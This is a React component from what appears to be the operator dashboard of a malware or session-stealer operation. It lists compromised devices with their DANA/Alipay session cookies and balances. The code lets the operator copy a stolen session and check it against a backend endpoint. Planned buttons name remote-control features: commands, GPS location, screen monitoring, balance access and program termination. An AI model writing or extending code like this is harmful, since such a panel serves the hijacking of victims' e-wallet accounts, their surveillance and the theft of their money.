import { useDispatch, useSelector } from "react-redux"
import { useNavigate } from "react-router-dom"
import { useEffect, useState } from "react"
import { toast } from "react-toastify"
import { Modal } from "bootstrap"

import { dispatchDataTemp, dispatchLogout } from "../../store/store"

import clipboard from "../../utils/clipboard"

import axios from "axios"

const style = {
  userSelect: {
    userSelect: "none",
    cursor: "pointer",
    WebkitUserSelect: "none",
    msUserSelect: "none",
    WebkitTouchCallout: "none",
    touchAction: "manipulation",
  },
  listThumbContainer: {
    width: "80px",
    height: "80px",
  },
  listsMoreContainer: {
    position: "absolute",
    width: "80vw",
    height: "80vh",
    top: 0,
    right: 40,
    zIndex: 10,
  },
  listsMoreDetailContainer: {
    flex: 1,
    overflowWrap: "break-word",
    wordBreak: "break-word",
  },
  listsSheetBackdrop: { backgroundColor: "rgba(0,0,0,0.6)", zIndex: 1040 },
  listsSheetButton: { borderRadius: "0.9rem", fontSize: "0.8rem", padding: "6px" },
}

function UserCardSheetButton({ icon, title, onClick }) {
  const theme = useSelector((state) => state.theme)
  const { mode, background, color } = theme

  return (
    <div className="col-12 col-md-6">
      <div className="d-flex p-1" style={style.userSelect} onClick={onClick}>
        <button className={`btn btn-sm col d-flex p-2 gap-2 ${background} ${color}`}>
          <div className="d-flex justify-content-center align-items-center" style={{ width: "50px" }}>
            <span className="material-symbols-outlined" style={{ scale: "1.2", aspectRatio: "1/1" }}>
              {icon || "settings_night_sight"}
            </span>
          </div>
          <div className="d-flex align-items-center w-100">
            <p className="text-7 m-0">{title || "SETTING"}</p>
          </div>
        </button>
      </div>
    </div>
  )
}

export default function CardDevice({ image, model, community, id, alipay, balance, percentage, status, start, data, onDoubleClick }) {
  const img = "https://storage.googleapis.com/storage-ajaib-prd-coin-wp-artifact/2023/06/pepe-coin.webp"

  const navigate = useNavigate()
  const dispatch = useDispatch()

  const HOST = useSelector((state) => state.user.HOST)

  const [duration, setDuration] = useState("00:00:00")
  const [sheet, setSheet] = useState(false)

  const theme = useSelector((state) => state.theme)
  const { mode, background, color } = theme

  const viewData = () => {
    dispatch(dispatchDataTemp({ ALIPAYJSESSIONID: alipay, image: image || img, model, data }))
    setSheet(false)
    showResult()
  }

  const showResult = (type) => {
    const modalElement = document.getElementById("modal-result")
    const modal = Modal.getOrCreateInstance(modalElement)

    if (type === "close") return modal.hide()

    modal.toggle()
  }

  const checkSession = async (ALIPAYJSESSIONID) => {
    try {
      const accessToken = localStorage.getItem("accessToken")
      const { data } = await axios.post(HOST + "/users/dana/checker", { ALIPAYJSESSIONID }, { headers: { Authorization: `Bearer ${accessToken}` } })

      dispatch(dispatchDataTemp({ ALIPAYJSESSIONID: alipay, image: image || img, model, data }))
      setSheet(false)
      showResult()
    } catch (err) {
      const status = err.status && typeof err.status === "number" ? err.status : err.response && err.response.status ? err.response.status : 500
      const message = err.response && err.response.data.message ? err.response.data.message : "Internal Server Error"

      toast.error(message, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: false,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            localStorage.clear()
            dispatch(dispatchLogout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  const features = async (event) => {
    try {
      toast.warning(`${event.target.textContent} WILL AVAILABLE SOON`, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: false,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "colored",
      })
    } catch (err) {
      const status = err.status && typeof err.status === "number" ? err.status : err.response && err.response.status ? err.response.status : 500
      const message = err.response && err.response.data.message ? err.response.data.message : "Internal Server Error"

      toast.error(message, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: false,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            localStorage.clear()
            dispatch(dispatchLogout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  useEffect(() => {
    const interval = setInterval(() => {
      const c = new Date() - new Date(start)
      const h = Math.floor(c / (1000 * 60 * 60))
      const m = Math.floor((c % (1000 * 60 * 60)) / (1000 * 60))
      const s = Math.floor((c % (1000 * 60)) / 1000)
      setDuration(`${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`)
    }, 1000)

    return () => clearInterval(interval)
  }, [start])

  return (
    <>
      <div
        className="card-image position-relative text-white overflow-hidden"
        style={{
          aspectRatio: "2/2.8",
          flex: "1 0 120px",
          borderRadius: "0.6rem",
          backgroundImage: `url(${image || img})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          filter: "brightness(0.7) grayscale(0.15)",
          cursor: "pointer",
        }}
        onMouseEnter={(e) => {
          const overlay = e.currentTarget.querySelector(".overlay-hover")
          if (overlay) overlay.style.opacity = 1
        }}
        onMouseLeave={(e) => {
          const overlay = e.currentTarget.querySelector(".overlay-hover")
          if (overlay) overlay.style.opacity = 0
        }}
      >
        <div
          className="position-absolute bottom-0 w-100"
          style={{
            height: "60%",
            background: "linear-gradient(to top, rgba(0, 0, 0, 1), transparent)",
          }}
        />

        <div className="position-absolute bottom-0 px-2 py-3 w-100">
          <h6 className="m-0 fw-bold">{model}</h6>
          <small className="text-light text-7">Rp.{balance || " - "}</small>
        </div>

        <div className="position-absolute top-0 end-0 px-1 py-1">
          <small className="text-light text-7 rounded-pill px-2 py-1" style={{ background: "rgba(0, 0, 0, 0.3)" }}>
            {duration}
          </small>
        </div>

        <div
          className="overlay-hover position-absolute top-0 start-0 w-100 h-100 d-flex flex-column justify-content-center py-2 align-items-center"
          style={{
            background: "rgba(0, 0, 0, 0.81)",
            opacity: 0,
            transition: "opacity 0.3s ease-in-out",
          }}
          onDoubleClick={() => setSheet(true)}
        >
          <p className="text-8 m-0">{community}</p>
          <p className="text-8 m-0">
            {percentage || "0"}% {status || "UNKNOWN"}
          </p>
          <p className="fw-bold text-7 mt-3">(double tap to see more)</p>
        </div>
      </div>

      {sheet && (
        <>
          <div className="position-fixed top-0 start-0 w-100 h-100" style={style.listsSheetBackdrop} onClick={() => setSheet(false)}></div>

          <div className="d-flex flex-column position-fixed bottom-0 start-0 end-0 rounded-top shadow-lg animate-slide-up" style={{ ...style.userSelect, zIndex: 1050 }}>
            <div className={`container p-0 ${background} ${color}`} style={{ width: "95vw", borderRadius: "0.9rem 0.9rem 0rem 0rem" }}>
              <div
                className={`${background} ${color}`}
                style={{
                  position: "sticky",
                  top: 0,
                  zIndex: 1,
                  borderRadius: "0.9rem 0.9rem 0rem 0rem",
                }}
              >
                <div className="d-flex justify-content-center py-1" style={style.userSelect}>
                  <span className="material-symbols-outlined">more_horiz</span>
                </div>

                <div className="d-flex flex-row px-3 pt-1 pb-3">
                  <div className="d-flex justify-content-center align-items-center" style={{ width: "100px" }}>
                    <img src={image || img} alt={image || img} className="img-square" />
                  </div>
                  <div className="px-3" style={style.listsMoreDetailContainer}>
                    <h6 className="text-uppercase m-0">{model}</h6>
                    <p className="text-7 m-0">
                      {community} {id}
                    </p>
                    <p className="text-6 mt-0">{alipay}</p>
                    <p className="text-6 m-0">Rp.{balance}</p>
                  </div>
                </div>
              </div>

              <div className="container p-0 hide-scroll" style={{ maxHeight: "50vh", overflowY: "auto" }}>
                <div className="row g-2 pb-3">
                  <UserCardSheetButton icon="timer" title={duration} />
                  <UserCardSheetButton icon="content_copy" title="COPY SESSION" onClick={() => clipboard(alipay)} />
                  <UserCardSheetButton icon="download" title="VIEW EXISTS DATA" onClick={() => viewData()} />
                  <UserCardSheetButton icon="science" title="CHECK" onClick={() => checkSession(alipay)} />
                  <UserCardSheetButton icon="code" title="PULL CODE" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="power_off" title="DISCONNECT FROM SOCKET" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="terminal" title="COMMAND" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="close_small" title="TERMINATE PROGRAM" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="restart_alt" title="RESTART SOCKET" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="location_searching" title="LOCATION GPS" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="location_on" title="LOCATION NETWORK" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="screenshot_monitor" title="MONITOR" onClick={(event) => features(event)} />
                  <UserCardSheetButton icon="attach_money" title="BALANCE" onClick={(event) => features(event)} />
                </div>
              </div>
            </div>
          </div>
        </>
      )}
    </>
  )
}
